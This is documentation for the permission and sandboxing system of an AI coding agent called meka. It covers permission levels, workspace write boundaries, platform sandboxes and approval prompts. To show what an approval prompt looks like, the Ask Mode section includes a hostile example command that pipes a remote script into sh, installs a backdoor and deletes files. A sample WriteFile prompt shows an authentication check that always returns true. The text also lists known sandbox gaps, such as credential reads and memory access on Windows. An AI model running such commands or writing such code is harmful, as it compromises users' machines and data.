# Permissions

meka uses a five-level permission system to control what tools the agent can use. This gives you
control over the agent's capabilities and prevents accidental modifications.

## Permission Levels

| Level | Indicator | What it allows |
|-------|-----------|----------------|
| **None** | `[n]` (green) | No tools. The agent can only respond with text. |
| **Read** | `[r]` (yellow) | Read-only tools: `read_file`, `find_files`, `search_contents`, `fetch_url`, `search_web`, `execute_command` (sandboxed read-only), `todo`, `agent_spawn`, scratchpad tools |
| **Workspace** | `[w]` (orange) | Every tool, no approval prompts, but **writes are confined to the workspace roots**. Reads stay unrestricted. `execute_command` runs in a sandbox that permits writes only under those roots |
| **Ask** | `[a]` (magenta) | Every tool, writes reach anywhere, no confinement at all, but each call requires user approval (Y/n prompt). `execute_command` runs unsandboxed once approved, with the same reach as an approved `write_file` |
| **Unrestricted** | `[u]` (red) | Every tool, no approval, no boundary. `execute_command` runs with no sandbox at all |

The ladder is ordered by **reach**, not by autonomy. `ask` sits above `workspace` because an
approved call at `ask` can write anywhere on the machine, while `workspace` cannot leave its roots
however many times it is invoked. The two are genuinely incomparable in the other direction:
`workspace` is more autonomous (nothing is approved) and `ask` reaches further.

That holds for the shell as well as the file tools, which it did not before 0.42.0. `ask` used to
run `execute_command` in the read-only sandbox, so approving `foo > bar` produced a permission
error the user had not asked for while an approved `write_file` in the same session wrote anywhere.
It also stood the ordering on its head, since the shell at `ask` then reached *less* far than the
shell at `workspace`. At `ask` the approval prompt is the whole gate, and it shows you the command
before it runs.

## The workspace boundary

At `workspace`, a write may land under:

- the working directory (which `/cd` moves),
- any folder an ACP client supplied as an additional directory,
- any `--writable-root <PATH>` you passed, repeatable.

Roots are resolved to their canonical form, so a symlink inside the workspace that points out of it
resolves to where it actually lands and is refused. A root that does not exist is dropped rather
than trusted; if none resolve, nothing is writable. A `--writable-root` that does not resolve at
startup is reported as a warning, and kept: a build directory that does not exist yet becomes a root
the moment it does.

**The boundary follows the working directory.** It is recomputed on every write rather than fixed
when the session starts, so `/cd /etc` at `workspace` makes `/etc` writable from that point on. This
is deliberate: the working directory *is* the workspace, and a boundary that stayed behind after you
moved would refuse writes to the place you are plainly now working in. The agent has no tool that moves the working
directory, so it cannot relocate its own boundary. You can, with `/cd`; and under `meka serve` a
client holding `sessions:w` can, with `PATCH /v1/sessions/{id}`.

Because the boundary follows the directory, the directory is recorded on the session row and a
[resume reopens it](./sessions.md) rather than adopting your shell's. Resuming a `workspace` session
from `$HOME` would otherwise make your whole home directory writable without you asking.

One consequence worth knowing: a *relative* `--writable-root` resolves against your shell, not
against the session. `meka -c --writable-root build` run from `~` grants `~/build`, while the
session itself may reopen in `~/project`. That follows from the flag belonging to the process rather
than to the session; pass an absolute path when you mean a directory inside the session's.

`--writable-root` belongs to the process and reaches the REPL, a one-shot run, and an ACP session.
It does **not** reach a session created through `POST /v1/sessions`: the HTTP API is single-root, so a session there is confined to its own
`cwd` and nothing else. Extra roots supplied by an ACP client apply to that client's session only,
and meka does not report your `--writable-root` back to the client as though the client had asked
for it.

Because it belongs to the process, it is not recorded on the session either, and resuming a session
does not bring it back: pass it again. This is the difference between it and the provider profile
and permission level, which *are* recorded and *do* come back. Writing it to the row would mean a
`meka serve` sharing the data directory could later grant those roots to a job it fires, on the
authority of a flag that process was never given.

The same set governs both halves, derived once so they cannot disagree: the file tools check it
before writing, and the shell sandbox is built from it. A refusal from `write_file` names the roots
so the agent can retry somewhere valid.

If `[shell].sandbox = false`, `execute_command` is refused at `workspace` rather than run
unconfined. Nothing else would be holding the boundary, and half a boundary reported as a whole one
is worse than an error that says so. Use `unrestricted` for those turns.

### What it does not cover

Four limits, stated plainly because none of them is visible from the inside:

- **MCP servers are not sandboxed.** They run in their own process, which meka does not confine, so
  a tool from an MCP server can write anywhere the server can, and no boundary meka can express
  reaches it. A tool with no permission annotation falls back to `unrestricted`, and meka **refuses**
  it at `workspace` rather than dispatching it, because `Permission::allows` treats `workspace`,
  `ask` and `unrestricted` as equal and would otherwise let it straight through. To use one from
  `workspace`, name it in `[mcp.servers.*].tool_permissions` at a level you are willing to grant, or
  switch to `unrestricted`.
- **meka's own stores are outside the boundary and always writable**: memories and the session
  database under `MEKA_DATA_DIR`, skills under `MEKA_CONFIG_DIR`. They are governed by their own
  config keys, not by this one.
- **Reads are never confined**, at any level. The boundary is "this cannot change things outside
  the workspace", not "this cannot see them".
- **The in-process fence resolves paths, it does not pin them.** `write_file` and `edit_file`
  resolve every existing component of a target before judging it, so a symlink already planted on
  the path is caught. What is left open is the race: a directory checked and then swapped for a
  symlink before the write lands. Closing it means holding a directory descriptor through the write
  on every platform, which is a larger mechanism than this one. It needs a *concurrent* writer
  planting the link mid-call to matter, which is consistent with the sandbox being defence against
  an agent damaging your data by accident rather than an adversarial containment boundary.

### Per-platform enforcement

| Platform | Backend | Confines the shell |
|----------|---------|--------------------|
| Linux | Bubblewrap (preferred) | Yes: read-only root bind, plus a writable bind per root |
| Linux | Landlock (fallback) | Yes: one path-beneath rule per root |
| macOS | `sandbox-exec` | Yes: writable subpath per root |
| Windows | `WRITE_RESTRICTED` token + per-root ACE | Yes: writes are permitted only where a workspace capability has an ACE |

Under Bubblewrap, `/tmp`, `/run` and `/var/tmp` are masked with a tmpfs, so paths there are not
merely unwritable but invisible. A workspace root under `/tmp` is bound after the mask and stays
reachable.

Windows works differently enough to be worth stating. meka mints a deterministic capability SID per
workspace root, adds an inheritable write ACE for it on that root, and runs the shell under a
`WRITE_RESTRICTED` token carrying that capability. Three consequences:

- **It writes to your directory's ACL.** The grant is real, standing state, visible in `icacls` as
  an `S-1-4-…` entry. meka takes it back when the process exits, including on Ctrl+C, and logs how
  to remove it by hand if revocation fails. The next run re-adds it, which costs one pass over the
  tree.

  **A crash or a kill still strands it.** Nothing runs on those paths, so the ACE outlives them. It
  grants nothing to anyone but a meka run in that same directory, and is reused rather than
  duplicated next time, but if you want it gone:
  `icacls "<root>" /remove:g *<the S-1-4-… from icacls>`.

  The grant is tracked per process, not per session, so several sessions confining the same root
  share one ACE, and it is released when the process exits rather than when any one of them ends.
  Under `meka serve` that means the ACE stands for the lifetime of the server.
- **It needs you to own the root.** Ownership supplies `WRITE_DAC` implicitly, which is what lets
  meka grant without elevation. A network share or another user's folder cannot be a workspace root.
- **Writes are restricted; nothing else is.** A `WRITE_RESTRICTED` token intersects write accesses
  only. Anything carrying an explicit `Everyone: Write` ACE stays writable even outside the
  workspace, which has no Unix analogue.

  This one is a deliberate trade, not an oversight. The restricting list has to include `Everyone`
  or PowerShell cannot start: the .NET runtime fails to initialise with `E_ACCESSDENIED` before it
  evaluates anything, so every shell command dies. Measured both ways on Windows 11: dropping
  `Everyone` closes the hole and takes the entire shell with it. Writes inside the workspace, to
  files new and pre-existing, and to meka's own output pipe all behave the same either way, so a
  filesystem-only test makes the change look free. Files carrying an explicit `Everyone: Write` ACE
  are rare and usually a misconfiguration in their own right; a `workspace` mode that cannot run a
  command is not a usable mode.

- **The confined child shares meka's console and integrity level.** `read` mode gets a private
  console and a Low-integrity token, so Windows' UI privilege isolation stands between it and meka.
  A `workspace` child gets neither: a restricted token cannot create a console, only inherit one,
  and the integrity label is deliberately left alone so ordinary tooling keeps working. The child
  can therefore write to the terminal outside meka's own rendering, and window messages between the
  two are not blocked. It is confined on the filesystem, which is what the mode promises, and it is
  not isolated from the meka process itself.

- **A `workspace` command can read meka's process memory, and a `read` command cannot.** This is
  the one axis on which `workspace` is *weaker* than the level below it, so it is worth stating
  plainly. `WRITE_RESTRICTED` intersects the restricting SIDs for write access only, and the
  integrity label is left alone, so nothing stops a `workspace` child calling `OpenProcess` with
  `PROCESS_VM_READ` against meka and reading whatever the process is holding, **including your
  provider credentials**. Measured on real hardware: a native probe run at `workspace` read a
  canary string straight out of meka's heap, while the identical probe at `read` failed at
  `OpenProcess` with `ERROR_ACCESS_DENIED`, because Low integrity refuses the handle. There is no
  clean fix inside the current design. Dropping the `workspace` child to Low integrity would
  confine it to the Low-integrity surface and take the workspace write grant with it, and a deny
  ACE on meka's own process would have to name a SID the child carries but meka does not, which
  the restricted token does not provide. Treat `workspace` on Windows as protecting your files
  from the agent, not as protecting meka's secrets from a command the agent runs.

- **PowerShell runs in ConstrainedLanguage mode.** The restricted token triggers it, and `read` and
  `unrestricted` are unaffected (both report `FullLanguage`). Scripts that construct .NET types or
  set properties on them will fail at `workspace` where they work at `unrestricted`. meka's own
  UTF-8 output preamble is skipped rather than run there, so non-ASCII output at `workspace` is
  decoded with the host's legacy code page and may be mangled.

The mechanism is a port of a community proof-of-concept rather than a vendor-supported sandboxing
API, unlike Landlock, Bubblewrap and Seatbelt. It is the tightest boundary Windows offers without
provisioning machine-level identities, which would need an Administrator setup step.

## Default Permission

The default permission is **read**. The default *enabled* set is
`none / read / workspace / unrestricted`. **`ask` is opt-in**: enable it under `[permissions]` in
your config if you want approval prompts.

Shift+Tab reaches `workspace` before `unrestricted`, so the confined mode is the one you land on
first when you want the agent to change something.

You can change the start mode with:

- CLI flag: `meka --permission workspace`
- Environment variable: `export MEKA_PERMISSION=workspace`
- Config file: `[permissions] default = "workspace"`; see [Config File](../configuration/config-file.md#permissions)

If `--permission` or `MEKA_PERMISSION` selects a mode that isn't in `[permissions].enabled`, meka
logs a warning and starts in the configured default instead of refusing to launch.

If every entry in `[permissions].enabled` is unusable -- most likely a config written before `write`
was split -- meka warns and falls back to **`read` alone**, not to the default set. A failed parse
must never resolve to more authority than you wrote, and the default set is four modes wide.

## Upgrading from `write`

The `write` mode was split in 0.42 and the name is retired. It resolves to nothing, and every
surface says which of the two replaced it:

- **`workspace`** for writes confined to the working directory. This is what most `write` users
  actually wanted.
- **`unrestricted`** for the old behaviour exactly: no boundary, no sandbox on the shell.

`write` is refused rather than reassigned on purpose. The same words are also *requirements* in
`[tools.tool_permissions]`, `[mcp.servers.*].tool_permissions` and `[mcp].default_permission`, where
silently re-pointing the name at the narrower mode would have admitted tools a rung earlier than
their author intended. A hard failure at every door is the safe direction.

Anything meka persisted for itself (a sub-agent's saved spec, a scheduled job's gate) needs the
one-shot migration script; those values were never typed by you and cannot be fixed by hand.

## Changing Permissions at Runtime

Press **Shift+Tab** to cycle through permission levels:

```text
none → read → workspace → ask → unrestricted → none → ...
```

Disabled modes are skipped during cycling. With the default enabled set, Shift+Tab cycles
`none → read → workspace → unrestricted → none`.

Or use the `/permission` slash command:

```text
/permission workspace
/permission unrestricted
```

`/permission <mode>` against a disabled mode prints an error naming the currently enabled set.

The prompt indicator updates immediately to reflect the new level. The agent learns the current level via a per-turn `[Permission context]` block prepended to your message (see *How Permissions Work* below).

## Ask Mode

In ask mode, the agent has access to all tools, but each tool call is paused for your approval:

```text
[ask] Shell
  command: ls -la
Allow? (Y/n)
```

Press **Enter** or **y** to approve, or **n** to deny. If denied, the agent receives an error and may try an alternative approach.

Only `y`, `yes`, `n`, `no` (any case) and a bare Enter mean anything. Anything else is not an answer,
so meka says `Please answer y or n.` and asks again rather than guessing; after three unanswered
attempts it denies. Ending the input (Ctrl+D, or a redirected stdin running out) also denies, since
nobody is there to approve.

Ctrl+C does not dismiss the prompt: it cancels the turn, but the prompt is still waiting to be
answered, and the next Enter answers it. Use `n` or Ctrl+D to get out of one.

This mode is useful when you want the agent to have full capabilities but want to review each action before it executes.

### What the prompt shows

**Every argument the tool was called with**, not just the one the `[tool ...]` indicator picks out.
That distinction matters: the indicator's argument is the *destination* for every write-shaped tool,
so a prompt built from it would ask you to authorise writing to a path without showing the content,
or editing a file without showing the edit.

```text
[ask] WriteFile
  path: src/auth.rs
  content:
    pub fn verify(token: &str) -> bool {
        true
    }
Allow? (Y/n)
```

A long value wraps rather than being cut, so the end of a shell pipeline cannot be hidden from the
line you are approving.

**Where something has to be left out, the end is kept.** A value too long to wrap in full shows its
beginning, a count of what was dropped, and then its final row:

```text
[ask] Shell
  command:
    curl -s https://example.com/setup.sh | sh -c 'cat >> ~/.bashrc &&
    ... 85688 more characters ...
    systemctl enable backdoor && rm -rf /important'
Allow? (Y/n)
```

That matters more here than anywhere else in meka. A shell pipeline puts its consequence last, so a
prompt that fills its rows from the top and stops hides the exact part you are being asked about.

The limits: 20 lines and 60 rows per argument, and 100 rows of block before further arguments are
dropped and named -- 161 rows at the very worst. Those sit an order of magnitude above anything a real
tool call carries; they are there so a call with two hundred invented arguments cannot scroll the
real one off the top of your screen without saying so.

Whenever a marker appears, **denying costs nothing**: say no, inspect the file or the session with
`meka session export`, and let the agent retry.

This is deliberately unaffected by [`display.tool_params`](../configuration/config-file.md#displaytool_params),
which controls the passive indicator. Turning that off for a quieter scrollback does not make your
approval prompts show less.

One consequence worth knowing: if the model passes a secret as a tool argument, an approval prompt
puts it on screen. That is the correct trade at the moment you are authorising the call, but it does
mean such a value lands in your scrollback.

## How Permissions Work

When the agent attempts to use a tool, meka checks whether the current permission level allows it:

- If allowed, the tool executes normally.
- In ask mode, you are prompted to approve or deny.
- If denied, meka returns an error message to the agent explaining which level is required and suggests running `/permission <level>`.

### Telling the agent the current level

meka lists **every registered tool** in the per-turn `<context>` block with its required permission level inline (nothing is filtered out), and the same block carries a compact `[Permission context]` section:

```text
<context>
[Permission context]
Current permission level: read
Only read-only tools are executable.

[Environment context]
Working directory: /home/you/project

[Available tools]
- **read_file** (requires `read`)
- **write_file** (requires `workspace`)
...
</context>
```

That two-line permission section is almost the only permission-dependent content in the request; `[Environment context]` is the other, since it is empty at `none` and gains a writable-roots block at `workspace`. The system prompt and the tools-array schemas stay byte-identical across `/permission` toggles, so mid-session level changes don't invalidate the Claude prompt cache; the entire conversation stays warm.

The same reasoning is why the tool catalogue itself lives here rather than in the system prompt. Prompt caching is prefix-based, and the system prompt heads that prefix, so anything cached there that later changes (an MCP server connecting late or hot-swapping its tools, a skill being installed) would re-cache the entire conversation behind it. The `<context>` block rides inside your own message instead, so changes are appended rather than rewritten.

Only what actually changed is re-sent. The first turn of a session carries the full catalogue, skill list, and any MCP server instructions; a turn where nothing moved carries none of it, and a turn where something moved carries a short note naming just that change.

### MCP tool permissions

MCP tools are classified through a 5-step resolution chain: per-tool override → server-level override → the server's own `readOnlyHint` → `[mcp].default_permission` → a hardcoded `unrestricted` fallback. See the *Permission resolution* section of the [Config File](../configuration/config-file.md) docs for the full rules and how to override a misclassified tool.

### Built-in tool permissions

Any built-in tool's required permission can be overridden from `config.toml` without editing code; see [`[tools]`: built-in tool filters](../configuration/config-file.md#tools-built-in-tool-filters). The same section documents how to allow-list or block-list specific built-ins (e.g. disabling `search_web` in a locked-down environment).

### Sub-agent permissions

Sub-agents spawned via `agent_spawn` inherit the parent's permission level by default. At `unrestricted` the sub-agent can call `write_file`, `edit_file`, and unsandboxed `execute_command`; at `read` it's confined to read-only tools. To run one delegated task with reduced privileges, pass the `permission` parameter (e.g. `agent_spawn({prompt: "...", permission: "read"})`): it is clamped to the parent's level as a ceiling, so a sub-agent can only ever be equal-or-more restricted, never escalated. Because `workspace` and `ask` are incomparable, a request for one under a parent holding the other resolves to the parent's own level rather than granting either. Alternatively, cycle the parent into a lower mode before issuing the spawning prompt to restrict every sub-agent it spawns.

## Examples

### Read Mode (Default)

```text
meka [r] > read the contents of main.rs
```

The agent uses `read_file` and shows the contents. Shell commands also work in read mode, but run in a **read-only sandbox**; the filesystem is write-protected for the child process:

```text
meka [r] > list the files in this directory
meka [r] > show me the git log
```

Commands like `ls`, `cat`, `git log`, `df`, `ps`, and `uname` work normally. Commands that attempt to write to the filesystem (e.g. `touch`, `rm`, `mkdir`) fail with a permission error.

Two things the sandbox deliberately does **not** restrict, on every backend:

- **Reads.** A sandboxed command can read anything your user can, including `~/.ssh`, `~/.aws/credentials` and meka's own database. Read mode protects the machine from being *changed*, not from being *read*.
- **The network.** Outbound connections are left open, so a read-mode command can still send what it read. Provider API keys are scrubbed from the child's environment, but that is one vector, not a boundary.

On Windows, `workspace` extends that first point to meka's own process. Its `WRITE_RESTRICTED` token restricts writes only, and unlike `read` it deliberately leaves the integrity label at the parent's level, so a confined command can open meka with `PROCESS_VM_READ` and read its memory. Measured on Windows 11: `OpenProcess` succeeds and `ReadProcessMemory` returns data. This is the one respect in which `workspace` confines less than `read`, whose Low-integrity token Windows blocks from opening a medium-integrity process at all. It grants nothing that reading meka's database file would not, which a command at either level can already do, but it is worth knowing if you were treating `workspace` as strictly wider than `read` in every direction. They are not ordered that way; see the ladder note above.

If no sandbox backend is usable, read-mode shell commands **fail** rather than running unconfined. On Linux that means Bubblewrap (preferred whenever `bwrap` is installed) or Landlock at ABI v3 or newer. Landlock below v3 does not mediate `truncate(2)`, so a "read-only" command could still empty an existing file, and meka refuses it rather than promise a protection the kernel is not enforcing. Kernels 5.13–6.1 therefore need `bwrap` installed for read-mode shell; `meka` says so at startup.

If you ask the agent to modify a file:

```text
meka [r] > add a comment to the top of main.rs
```

The agent will explain that it cannot write files in read mode and suggest switching to `workspace`.

#### What read mode does still write

Read mode means the agent cannot modify **your tree**. It can still write to stores meka owns, because otherwise an agent at read permission could never remember anything:

| Store | Location | Tools |
|-------|----------|-------|
| Memory | the `memories` table in `MEKA_DATA_DIR` | `memory_write`, `memory_delete` |
| Skills | `~/.config/meka/skills/` | `skill_write`, `skill_delete` (only with [`[skills] agent_managed`](../configuration/config-file.md#skills)) |
| Scratchpad, todos, scheduled jobs, background tasks | the session database | various |

Of those, only the skill tools reach the filesystem at all; memory is a database table. That boundary is enforced in two places: a skill name must be one path component matching the Agent Skills spec's own rule (lowercase letters, digits and hyphens), so it cannot contain `..` or a path separator, and a symlink sitting at that name is refused rather than followed, so an existing link cannot redirect a write out of the store. Memory names are governed by a different and wider rule (`[A-Za-z0-9_-]`), which is safe for a different reason: a memory name is a primary key in a table, never a path. `write_file`, `edit_file` and `scratchpad_save_file` are the only built-ins that touch your tree, and all three require `workspace` or above, and are fenced to the workspace roots at that level.

A root you asked for is not always a root you get. `--writable-root` drops a path three ways, each with a warning: one that is not a directory, one naming a system directory the sandbox masks (`/`, `/proc`, `/dev`, `/sys`, `/run`, `/tmp`, `/var/tmp`, `$XDG_RUNTIME_DIR`), and one that does not resolve at startup -- the last is kept rather than refused, so a build directory becomes a root the moment it exists. See [CLI options](../configuration/cli-options.md#--writable-root-path).

#### MCP tools are the exception

Tools from MCP servers are not built-ins and are not covered by that boundary. They execute inside the server's own process, which meka does not sandbox, so what an MCP tool may do is bounded by the server, not by meka's permission level.

What decides whether such a tool is reachable at read is the permission meka resolves for it, and by default a server's own `readOnlyHint: true` annotation is enough to classify it as `read`. That hint is asserted by the server and not verified. A server that advertises it for a tool that in fact writes therefore gets to write your tree while meka sits at `read`.

For a server you have not audited, either pin its tools explicitly with [`tool_permissions`](../configuration/config-file.md#mcp) or set [`trust_read_only_hint = false`](../configuration/config-file.md#mcp) on it, which makes the hint advisory for display only and drops its tools to the strict `unrestricted` fallback, past `[mcp].default_permission`.

So the honest statement of read mode's filesystem guarantee is: your tree is safe from meka's built-in tools, plus whichever MCP servers you have chosen to trust.

> **Note:** The read-only sandbox uses Bubblewrap or Landlock (ABI v3+, kernel 6.2+) on Linux, `sandbox-exec` on macOS, and a Low-integrity token on Windows. See [Shell](../tools/shell.md#read-only-sandbox) for what each backend covers. Where no backend is usable, shell commands are not available at `read` or `workspace`. You can disable sandboxed shell execution by setting `sandbox = false` under `[shell]` in the config file (see [Config File](../configuration/config-file.md)), which makes `execute_command` require `unrestricted` instead.

### Workspace Mode

```text
meka [w] > run cargo test and show me the output
```

The agent uses `execute_command` to run the tests and shows the results.
